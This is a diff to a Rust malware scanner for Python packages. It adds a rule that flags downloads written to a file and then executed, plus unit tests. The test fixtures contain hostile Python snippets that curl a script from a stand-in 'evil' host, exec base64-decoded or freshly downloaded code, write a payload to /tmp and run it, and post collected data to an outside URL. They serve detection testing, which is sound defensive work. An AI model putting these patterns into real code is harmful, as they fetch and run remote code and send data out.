@@ -9,7 +9,8 @@ use phylaxis_core::{
     TaintSink, TaintSinkKind, TaintSource, TaintSourceKind, Verdict,
 };
 use phylaxis_graph::reach::{
-    ReachLimits, SourcePattern, control_paths, data_paths_to, find_sinks, find_sources,
+    ReachLimits, SourcePattern, control_paths, data_paths_to, data_paths_via, find_sinks,
+    find_sources,
 };
 
 use crate::catalogue::{RULES, SINK_PATTERNS, SOURCE_PATTERNS};
@@ -21,6 +22,10 @@ use crate::error::RulesError;
 /// targets the definitions that contain a matching read. The kinds in its `sinks` field are
 /// not consulted. Filed as an open request in DECISIONS.md.
 const SENSITIVE_READ_RULE: &str = "PHX-INS-003";
+
+/// "Download, write, execute" (ADR-029): the path must pass through a write into a file.
+/// Without that step the rule was PHX-DRP-001's predicate under another name.
+const VIA_FILE_WRITE_RULE: &str = "PHX-DRP-002";
 
 /// PHX-INS-002 is Medium, and High when the callee is `exec`/`eval` (RULES.md).
 const INSTALL_EXEC_RULE: &str = "PHX-INS-002";
@@ -63,11 +68,16 @@ pub fn evaluate_rule(
                 let sources = sources(pg, rule.sources);
                 // One search per source serves every sink; the index pairs each path with
                 // the sink it ends at, which is what the phase is read from.
-                let mut out: Vec<(ReachabilityPath, &TaintSink, usize)> =
+                let found = if rule.id == VIA_FILE_WRITE_RULE {
+                    let writes: Vec<_> = pg.dfg.file_writes.iter().map(|&(w, _)| w).collect();
+                    data_paths_via(pg, &sources, &writes, &targets, &ReachLimits::default())
+                } else {
                     data_paths_to(pg, &sources, &targets, &ReachLimits::default())
-                        .into_iter()
-                        .map(|(path, i)| (path, &targets[i], i))
-                        .collect();
+                };
+                let mut out: Vec<(ReachabilityPath, &TaintSink, usize)> = found
+                    .into_iter()
+                    .map(|(path, i)| (path, &targets[i], i))
+                    .collect();
                 // Canonical path order: by source location, then sink location, then the
                 // sink's position in `targets` (the order a per-sink search produced).
                 out.sort_by(|a, b| {
@@ -677,5 +687,79 @@ requests.post('https://c.invalid/', data=','.join(found))
 ";
         assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-EXF-001".to_owned()));
         assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-EXF-001".to_owned()));
+    }
+
+    // ── ADR-029: execution sinks execute their first argument only ─────────────────────
+
+    // The endpoint handed to `env=` is configuration; in the command it is executed.
+    #[test]
+    fn a_url_in_env_is_not_an_executed_endpoint() {
+        let bad = "import subprocess
+subprocess.run(['curl', 'https://evil.example.invalid/a.sh'])
+";
+        let good = "import subprocess
+subprocess.run(['git', 'status'], env={'PROXY': 'https://proxy.example.invalid/'})
+";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-DRP-003".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-DRP-003".to_owned()));
+    }
+
+    // A decoded literal executed is OBF-001; one passed as exec's globals is not code.
+    #[test]
+    fn a_decoded_literal_in_exec_globals_is_not_executed() {
+        let bad = "import base64
+exec(base64.b64decode('cHJpbnQoMSk='))
+";
+        let good = "import base64
+exec('x = 1', {'k': base64.b64decode('cHJpbnQoMSk=')})
+";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-OBF-001".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-OBF-001".to_owned()));
+    }
+
+    // No positional argument: the pattern keeps every argument rather than going silent.
+    #[test]
+    fn a_keyword_only_command_still_counts() {
+        let src = "import subprocess
+subprocess.run(args=['curl', 'https://evil.example.invalid/a.sh'])
+";
+        assert!(rules_d(&[("pkg/__init__.py", src)]).contains(&"PHX-DRP-003".to_owned()));
+    }
+
+    // DRP-002 needs the write (ADR-029): executing a download directly is DRP-001 alone;
+    // writing it to a file that is then run is DRP-002, and the write shows in the path.
+    #[test]
+    fn drp_002_requires_the_file_write_and_drp_001_does_not() {
+        let direct = "import urllib.request
+exec(urllib.request.urlopen('https://h.example.invalid/p').read())
+";
+        let written = "import subprocess, urllib.request
+p = '/tmp/payload'
+data = urllib.request.urlopen('https://h.example.invalid/p').read()
+with open(p, 'wb') as fh:
+    fh.write(data)
+subprocess.run([p])
+";
+        let d = rules_d(&[("pkg/__init__.py", direct)]);
+        assert!(
+            d.contains(&"PHX-DRP-001".to_owned()) && !d.contains(&"PHX-DRP-002".to_owned()),
+            "{d:?}"
+        );
+        let g = graph(&[("pkg/__init__.py", written)]);
+        let f = evaluate(&g, &ScanOptions::default()).unwrap();
+        let drp2 = f
+            .iter()
+            .find(|f| f.rule.as_str() == "PHX-DRP-002")
+            .expect("DRP-002 fires");
+        assert!(drp2.evidence.path.is_well_formed());
+        assert!(
+            drp2.evidence
+                .path
+                .steps
+                .iter()
+                .any(|s| s.detail.as_deref() == Some("written to a file")),
+            "{:?}",
+            drp2.evidence.path.steps
+        );
     }
 }
